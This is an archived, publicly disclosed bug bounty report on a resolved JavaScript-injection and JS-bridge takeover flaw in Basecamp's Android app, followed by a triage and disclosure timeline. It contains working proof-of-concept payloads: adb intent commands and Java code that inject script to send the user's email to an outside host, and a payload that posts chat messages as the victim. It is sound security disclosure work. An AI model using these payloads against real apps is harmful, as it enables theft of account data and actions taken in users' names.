---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-dom
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - DOM"
enriched: true
body: true
date: 2022-09-23
submitted: 2021-09-18T13:11:19.476Z
bounty_usd: null
votes: 21
cve: []
program: "[[programs/basecamp|Basecamp]]"
reporter: "fr4via"
source: "https://hackerone.com/reports/1343300"
title: "com.basecamp.bc3 Webview Javascript Injection and JS bridge takeover"
---
# com.basecamp.bc3 Webview Javascript Injection and JS bridge takeover

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 21 | **Program:** Basecamp | **Disclosed:** 2022-09-23

- Report: [https://hackerone.com/reports/1343300](https://hackerone.com/reports/1343300)
- CWE: Cross-site Scripting (XSS) - DOM
- Submitted: 2021-09-18T13:11:19.476Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

It was identified that the android **com.basecamp.bc3 application**, contains a Webview where the loaded URLs are not sanitised properly. As this webview's functionality is extended via javascript interfaces and has the javascript enabled it is possible to inject arbitrary javascript code which will be executed by the application's webview and provide access to the java native code via the class **a.a.a.s.g** ( which is exposed via the NativeApp).  

##JS Bridge

The following JS Bridges are exposed:

###nativeBridge

{F1452715}

###NativeApp


{F1452717}

###TurboNative

{F1452718}

##Steps to Reproduce

1. Create a valid basecamp account 
2. Create a project 

{F1452720}

3. Open any Sub-project tab (e.g. Message Board - it is needed only ONE time in order to initialise the JS interface  )


Run the following command after replacing the XXXXX with the user id 

Example: {F1452730}

Command:
```
$adb shell am start -W -a android.intent.action.VIEW -d 'https://3.basecamp.com/XXXXX/p","advance","---"); /* comment */ window.location.replace("https://example.com?exfiltration="+nativeBridge.getPage().accountName); //'
```

Observer the HTTP requests of the app:

```
GET /?exfiltration=USER_EMAIL@gmail.com HTTP/2
Host: example.com
....
````

## Impact

Confidentiality, Integrity and availability are all affected from the specific vulnerability as the javascript code can be injected to an already loaded url while additional functionality is added via the exposed javascript interfaces:

###Javascript Injection:

{F1452742}

###Bridge Access

"Bucket Name:"+nativeBridge.getPage().bucketName + "Title: " + nativeBridge.getPage().title + "User email:" +nativeBridge.getPage().accountName);

{F1452750}

### Cookie exfiltration:

{F1452769}

## Timeline

- **Report Filed**
- **2021-09-18** @fr4via: Adding the java POC for the shake of clarity:

1. Create a new android studio app
2. Add the following in the main activity (onCreate)

```
        Intent intent = new Intent ();
        intent.setData(Uri.parse("https://3.basecamp.com/5195267/projects/\",\"advance\",\"---\");/* aaa sss */ window.location.replace(\"https://example.com?exfaaa=\"+nativeBridge.getPage().accountName);//"));

        startActivity(intent);

```
3. Run the application
4. Observer the request to https://example.com
- **2021-09-18** @fr4via: some extra evidences, regarding the impact of the attack:
- Auto post to chat in behalf of the user:

am start -W -a android.intent.action.VIEW -d 'https://3.basecamp.com/5195267/p","advance","---"); /* comment */ nativeBridge.Chat.post("hahaha","test");//'
- **2021-09-19** @fr4via: correction on the above due to the markdown parse:

```
am start -W -a android.intent.action.VIEW -d 'https://3.basecamp.com/5195267/p","advance","---"); /* comment */ nativeBridge.Chat.post("hahaha","test");//'
```
- **2021-09-20** @rosa: Hey @fr4via, thanks for sending this detailed report! We'll check it out with our Android team and will let you know. 
Rosa
- **2021-09-22** @fr4via: Hi @rosa , any updates on this one ?
- **2021-09-22** @rosa: Hey @fr4via, our Android programmer is looking into it. I'll let you know when he has an update!
Rosa
- **2021-09-22** @fr4via: Thank you vm @rosa
- **2021-09-24** @fr4via: To help a bit more:

upon the described requests, the following activity is triggered:

**class com.basecamp.bc3.activities.WebViewActivity**

**[i] Intent Extra Type:** String
**[!] Intent Extra name:** intentUrl, value:https://3.basecamp.com/5195267/p","advance","---"); /* comment */ alert(2);//

[i] Intent Extra Type: String
[!] Intent Extra name: intentApiUrl, value:null

[i] Intent Extra Type: Bundle
[!] Intent Extra name: intentApiUrl

Finally the webview will load the following:
```
javascript: window.turboNative.visitLocationWithActionAndRestorationIdentifier("https://3.basecamp.com/5195267/p%22,%22advance%22,%22---%22);%20/*%20comment%20*/%20alert(2);//","advance","")
```
in the payload: ```https://3.basecamp.com/5195267/p","advance","---"); /* comment */ alert(2);//```, the double quote (**after ....5195267/p**) is parsed and populated in the js code, while it should be eliminated (e.g. add a slash when encountered).
- **2021-09-24** @rosa: Thanks @fr4via! I'll pass this over as well.
- **2021-09-29** @fr4via: Hi @rosa, 

Judging from the average times regarding Basecamp's program the average time to triage the issue is 1 day. There has been already 11 days since I reported the issue but the team haven't yet acknowledge it.  Are you facing challenges on reproducing it ?
- **2021-09-29** @rosa: Hey @fr4via, sorry for the delay! In this case, we're limited by our Android developer having to check it out and there's only one person on Android right now (who's juggling a bunch of different things). The average time in the program applies to all issues, for which there are at least 3 people available to triage. 
I'll let you know when I have updates, sorry for the delay.
Rosa
- **2021-09-29** @fr4via: Thanks @rosa, that makes sense, as imo it is risky leaving this issue dangling
- **2021-10-05** @fr4via: friendly ping for updates: issue hasn't been triaged after more than two weeks
- **2021-10-05** @fr4via: @rosa , it would be highly appreciated (by the community) that since you are facing such delay issues , to inform  the researchers for such long times for (even) your feedback. It is not "fair" for other programs with much lower reply rate , as you are getting focus which under fair conditions shouldn't be applied.
- **2021-10-05** @rosa: Hey @fr4via, sorry for the delay. As I explained, we are only facing this for some Android issues and not in general. We've received 3 reports including yours in the last 10 days and the other 2 have been replied to quite fast (within our advertised 72 hours). I'll change our notice to explain that for certain Android issues, the wait might be longer, but it's not a problem in our program in general.
- **2021-10-05** @fr4via: 17 days  is much "out" of the usual, I haven't experienced such a delay for the triage so far. If this was advertised or announced in your program page, tbo, I wouldn't spend half day assessing the app. It is reasonable to respect the people's timehours spent.
- **Report Triaged**
- **Bounty Awarded**
- **2021-10-09** @fr4via: Thank you @rosa
- **2022-07-10** @fr4via: has this been fixed @rosa
- **2022-09-08** @bangline: Hi @fr4via, apologies in the delay and thank you for your patience here. I can confirm a fix for this issue has been included in the recent versions of the Android app. Would you mind verifying that that fix addresses the vulnerability before I mark this report as resolved? Thanks!
- **2022-09-12** @fr4via: @bangline , is this a retest request ?
- **2022-09-12** @bangline: Yes, if that's possible @fr4via. The fix was shipped a couple of versions ago and wanted to ensure from your side it was addressed before marking the report resolved.
- **2022-09-12** @fr4via: @bangline , usually retests are rewarded. I'll simply apply the old payload and see if it is reproducible. I can't guaranty though that the fix covered alternative ways of exploitation.
- **2022-09-12** @bangline: The old payload replay would be appreciated, thank you @fr4via.
- **2022-09-16** @fr4via: Hi @bangline , confirmed. The payload mentioned here doesn't work anymore.
- **Report Resolved**
- **2022-09-19** @fr4via: can we disclose ?
- **Agreed On Going Public**
- **2022-09-22** @fr4via: @bangline friendly ping about the disclosure
- **2022-09-22** @rosa: Hey @fr4via, sorry for the delay here! Do you want to redact anything before disclosing or the full version is fine?
- **2022-09-23** @fr4via: Hey @rosa, sure we can redact the last 10 comments I guess as they are irrelevant.
- **2022-09-23** @rosa: Looks like HackerOne doesn't allow that kind of redacting. It needs to be a specific string in the original report. Alternatively, the disclosure can be limited, which means nothing is published, only a small summary we write and the timeline.
- **2022-09-23** @fr4via: I don't have a problem for a full disclosure (if you also don't have)
- **Agreed On Going Public**
- **Report Became Public**
